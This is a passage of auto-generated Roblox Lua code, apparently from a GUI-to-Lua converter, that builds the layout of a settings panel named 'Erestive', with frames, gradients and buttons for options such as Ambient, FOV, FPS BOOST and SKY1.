G2L["20d"]["BackgroundTransparency"] = 1;
G2L["20d"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["20d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20d"]["Text"] = [[Diffuse]];
G2L["20d"]["Name"] = [[Text]];
G2L["20d"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.WhiteBar
G2L["20e"] = Instance.new("Frame", G2L["20c"]);
G2L["20e"]["BorderSizePixel"] = 0;
G2L["20e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20e"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["20e"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["20e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20e"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.WhiteBar.UIGradient
G2L["20f"] = Instance.new("UIGradient", G2L["20e"]);
G2L["20f"]["Rotation"] = 90;
G2L["20f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider
G2L["210"] = Instance.new("Frame", G2L["20c"]);
G2L["210"]["BorderSizePixel"] = 0;
G2L["210"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["210"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["210"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["210"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Animations
G2L["211"] = Instance.new("LocalScript", G2L["210"]);
G2L["211"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Animations.Sample
G2L["212"] = Instance.new("ImageLabel", G2L["211"]);
G2L["212"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["212"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["212"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["212"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["212"]["BackgroundTransparency"] = 1;
G2L["212"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.SliderCircle
G2L["213"] = Instance.new("Frame", G2L["210"]);
G2L["213"]["BorderSizePixel"] = 0;
G2L["213"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["213"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["213"]["Size"] = UDim2.new(0.301, 0, 0.73679, 0);
G2L["213"]["Position"] = UDim2.new(0.8, 0, 0.1223, 0);
G2L["213"]["Name"] = [[SliderCircle]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.SliderCircle.UICorner
G2L["214"] = Instance.new("UICorner", G2L["213"]);
G2L["214"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.UIGradient
G2L["215"] = Instance.new("UIGradient", G2L["210"]);
G2L["215"]["Rotation"] = -90;
G2L["215"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.UICorner
G2L["216"] = Instance.new("UICorner", G2L["210"]);
G2L["216"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Button
G2L["217"] = Instance.new("TextButton", G2L["210"]);
G2L["217"]["TextSize"] = 14;
G2L["217"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["217"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["217"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["217"]["ZIndex"] = 2;
G2L["217"]["BackgroundTransparency"] = 1;
G2L["217"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["217"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["217"]["Text"] = [[ ]];
G2L["217"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Button.LocalScript
G2L["218"] = Instance.new("LocalScript", G2L["217"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.UIGradient
G2L["219"] = Instance.new("UIGradient", G2L["20c"]);
G2L["219"]["Rotation"] = -90;
G2L["219"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.UICorner
G2L["21a"] = Instance.new("UICorner", G2L["20c"]);
G2L["21a"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.OnOrOff
G2L["21b"] = Instance.new("TextLabel", G2L["20c"]);
G2L["21b"]["TextWrapped"] = true;
G2L["21b"]["ZIndex"] = 2;
G2L["21b"]["TextSize"] = 14;
G2L["21b"]["TextScaled"] = true;
G2L["21b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21b"]["BackgroundTransparency"] = 1;
G2L["21b"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["21b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["21b"]["Text"] = [[On]];
G2L["21b"]["Name"] = [[OnOrOff]];
G2L["21b"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.OnOrOff.Shadows
G2L["21c"] = Instance.new("LocalScript", G2L["21b"]);
G2L["21c"]["Name"] = [[Shadows]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient
G2L["21d"] = Instance.new("Frame", G2L["19c"]);
G2L["21d"]["BorderSizePixel"] = 0;
G2L["21d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21d"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["21d"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["21d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21d"]["Name"] = [[Ambient]];
G2L["21d"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.UIListLayout
G2L["21e"] = Instance.new("UIListLayout", G2L["21d"]);
G2L["21e"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV
G2L["21f"] = Instance.new("Frame", G2L["21d"]);
G2L["21f"]["BorderSizePixel"] = 0;
G2L["21f"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["21f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21f"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["21f"]["Name"] = [[FOV]];
G2L["21f"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.Text
G2L["220"] = Instance.new("TextLabel", G2L["21f"]);
G2L["220"]["TextWrapped"] = true;
G2L["220"]["ZIndex"] = 9;
G2L["220"]["TextSize"] = 14;
G2L["220"]["TextScaled"] = true;
G2L["220"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["220"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["220"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["220"]["BackgroundTransparency"] = 1;
G2L["220"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["220"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["220"]["Text"] = [[Ambient]];
G2L["220"]["Name"] = [[Text]];
G2L["220"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.WhiteBar
G2L["221"] = Instance.new("Frame", G2L["21f"]);
G2L["221"]["BorderSizePixel"] = 0;
G2L["221"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["221"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["221"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["221"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["221"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.WhiteBar.UIGradient
G2L["222"] = Instance.new("UIGradient", G2L["221"]);
G2L["222"]["Rotation"] = 90;
G2L["222"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.UICorner
G2L["223"] = Instance.new("UICorner", G2L["21f"]);
G2L["223"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig
G2L["224"] = Instance.new("Frame", G2L["21f"]);
G2L["224"]["BorderSizePixel"] = 0;
G2L["224"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["224"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["224"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["224"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.UICorner
G2L["225"] = Instance.new("UICorner", G2L["224"]);
G2L["225"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.FOVSet
G2L["226"] = Instance.new("TextBox", G2L["224"]);
G2L["226"]["Name"] = [[FOVSet]];
G2L["226"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["226"]["TextWrapped"] = true;
G2L["226"]["TextSize"] = 14;
G2L["226"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["226"]["TextScaled"] = true;
G2L["226"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["226"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["226"]["ClearTextOnFocus"] = false;
G2L["226"]["PlaceholderText"] = [[70, 70, 70 - classic]];
G2L["226"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["226"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["226"]["Text"] = [[70, 70, 70]];
G2L["226"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV
G2L["227"] = Instance.new("Frame", G2L["224"]);
G2L["227"]["ZIndex"] = 2;
G2L["227"]["BorderSizePixel"] = 0;
G2L["227"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["227"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["227"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["227"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["227"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Animations
G2L["228"] = Instance.new("LocalScript", G2L["227"]);
G2L["228"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["229"] = Instance.new("ImageLabel", G2L["228"]);
G2L["229"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["229"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["229"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["229"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["229"]["BackgroundTransparency"] = 1;
G2L["229"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.UICorner
G2L["22a"] = Instance.new("UICorner", G2L["227"]);
G2L["22a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Button
G2L["22b"] = Instance.new("TextButton", G2L["227"]);
G2L["22b"]["TextWrapped"] = true;
G2L["22b"]["TextSize"] = 14;
G2L["22b"]["TextScaled"] = true;
G2L["22b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["22b"]["BackgroundTransparency"] = 1;
G2L["22b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["22b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["22b"]["Text"] = [[ ]];
G2L["22b"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["22c"] = Instance.new("LocalScript", G2L["22b"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Button.Animations
G2L["22d"] = Instance.new("LocalScript", G2L["22b"]);
G2L["22d"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Text
G2L["22e"] = Instance.new("TextLabel", G2L["227"]);
G2L["22e"]["TextWrapped"] = true;
G2L["22e"]["ZIndex"] = 9;
G2L["22e"]["TextSize"] = 14;
G2L["22e"]["TextScaled"] = true;
G2L["22e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["22e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22e"]["BackgroundTransparency"] = 1;
G2L["22e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["22e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["22e"]["Text"] = [[Set]];
G2L["22e"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.UIGradient
G2L["22f"] = Instance.new("UIGradient", G2L["227"]);
G2L["22f"]["Rotation"] = -90;
G2L["22f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.UIGradient
G2L["230"] = Instance.new("UIGradient", G2L["21f"]);
G2L["230"]["Rotation"] = -90;
G2L["230"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame
G2L["231"] = Instance.new("Frame", G2L["19c"]);
G2L["231"]["BorderSizePixel"] = 0;
G2L["231"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["231"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["231"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["231"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["231"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.UIListLayout
G2L["232"] = Instance.new("UIListLayout", G2L["231"]);
G2L["232"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night
G2L["233"] = Instance.new("Frame", G2L["231"]);
G2L["233"]["BorderSizePixel"] = 0;
G2L["233"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["233"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["233"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["233"]["Name"] = [[night]];
G2L["233"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.Text
G2L["234"] = Instance.new("TextLabel", G2L["233"]);
G2L["234"]["TextWrapped"] = true;
G2L["234"]["ZIndex"] = 9;
G2L["234"]["TextSize"] = 14;
G2L["234"]["TextScaled"] = true;
G2L["234"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["234"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["234"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["234"]["BackgroundTransparency"] = 1;
G2L["234"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["234"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["234"]["Text"] = [[FPS BOOST]];
G2L["234"]["Name"] = [[Text]];
G2L["234"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.WhiteBar
G2L["235"] = Instance.new("Frame", G2L["233"]);
G2L["235"]["BorderSizePixel"] = 0;
G2L["235"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["235"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["235"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["235"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["235"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.WhiteBar.UIGradient
G2L["236"] = Instance.new("UIGradient", G2L["235"]);
G2L["236"]["Rotation"] = 90;
G2L["236"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.UICorner
G2L["237"] = Instance.new("UICorner", G2L["233"]);
G2L["237"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig
G2L["238"] = Instance.new("Frame", G2L["233"]);
G2L["238"]["BorderSizePixel"] = 0;
G2L["238"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["238"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["238"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["238"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.UICorner
G2L["239"] = Instance.new("UICorner", G2L["238"]);
G2L["239"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV
G2L["23a"] = Instance.new("Frame", G2L["238"]);
G2L["23a"]["ZIndex"] = 2;
G2L["23a"]["BorderSizePixel"] = 0;
G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["23a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23a"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations
G2L["23b"] = Instance.new("LocalScript", G2L["23a"]);
G2L["23b"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations.Sample
G2L["23c"] = Instance.new("ImageLabel", G2L["23b"]);
G2L["23c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23c"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["23c"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["23c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23c"]["BackgroundTransparency"] = 1;
G2L["23c"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.UICorner
G2L["23d"] = Instance.new("UICorner", G2L["23a"]);
G2L["23d"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button
G2L["23e"] = Instance.new("TextButton", G2L["23a"]);
G2L["23e"]["TextWrapped"] = true;
G2L["23e"]["TextSize"] = 14;
G2L["23e"]["TextScaled"] = true;
G2L["23e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["23e"]["BackgroundTransparency"] = 1;
G2L["23e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["23e"]["Text"] = [[ ]];
G2L["23e"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
G2L["23f"] = Instance.new("LocalScript", G2L["23e"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.Animations
G2L["240"] = Instance.new("LocalScript", G2L["23e"]);
G2L["240"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Text
G2L["241"] = Instance.new("TextLabel", G2L["23a"]);
G2L["241"]["TextWrapped"] = true;
G2L["241"]["ZIndex"] = 9;
G2L["241"]["TextSize"] = 14;
G2L["241"]["TextScaled"] = true;
G2L["241"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["241"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["241"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["241"]["BackgroundTransparency"] = 1;
G2L["241"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["241"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["241"]["Text"] = [[Set]];
G2L["241"]["Name"] = [[Text]];
G2L["241"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.UIGradient
G2L["242"] = Instance.new("UIGradient", G2L["23a"]);
G2L["242"]["Rotation"] = -90;
G2L["242"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.FOVSet
G2L["243"] = Instance.new("TextBox", G2L["238"]);
G2L["243"]["Visible"] = false;
G2L["243"]["Name"] = [[FOVSet]];
G2L["243"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["243"]["TextWrapped"] = true;
G2L["243"]["TextSize"] = 14;
G2L["243"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["243"]["TextScaled"] = true;
G2L["243"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["243"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["243"]["PlaceholderText"] = [[16 - classic]];
G2L["243"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["243"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["243"]["Text"] = [[]];
G2L["243"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.UIGradient
G2L["244"] = Instance.new("UIGradient", G2L["233"]);
G2L["244"]["Rotation"] = -90;
G2L["244"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame
G2L["245"] = Instance.new("Frame", G2L["19c"]);
G2L["245"]["BorderSizePixel"] = 0;
G2L["245"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["245"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["245"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["245"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["245"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.UIListLayout
G2L["246"] = Instance.new("UIListLayout", G2L["245"]);
G2L["246"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night
G2L["247"] = Instance.new("Frame", G2L["245"]);
G2L["247"]["BorderSizePixel"] = 0;
G2L["247"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["247"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["247"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["247"]["Name"] = [[night]];
G2L["247"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.Text
G2L["248"] = Instance.new("TextLabel", G2L["247"]);
G2L["248"]["TextWrapped"] = true;
G2L["248"]["ZIndex"] = 9;
G2L["248"]["TextSize"] = 14;
G2L["248"]["TextScaled"] = true;
G2L["248"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["248"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["248"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["248"]["BackgroundTransparency"] = 1;
G2L["248"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["248"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["248"]["Text"] = [[SKY1]];
G2L["248"]["Name"] = [[Text]];
G2L["248"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.WhiteBar
G2L["249"] = Instance.new("Frame", G2L["247"]);
G2L["249"]["BorderSizePixel"] = 0;
G2L["249"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["249"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["249"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["249"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["249"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.WhiteBar.UIGradient
G2L["24a"] = Instance.new("UIGradient", G2L["249"]);
G2L["24a"]["Rotation"] = 90;
G2L["24a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.UICorner
G2L["24b"] = Instance.new("UICorner", G2L["247"]);
G2L["24b"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig
G2L["24c"] = Instance.new("Frame", G2L["247"]);
G2L["24c"]["BorderSizePixel"] = 0;
G2L["24c"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["24c"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["24c"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["24c"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.UICorner
G2L["24d"] = Instance.new("UICorner", G2L["24c"]);
G2L["24d"]["CornerRadius"] = UDim.new(0.25, 0);


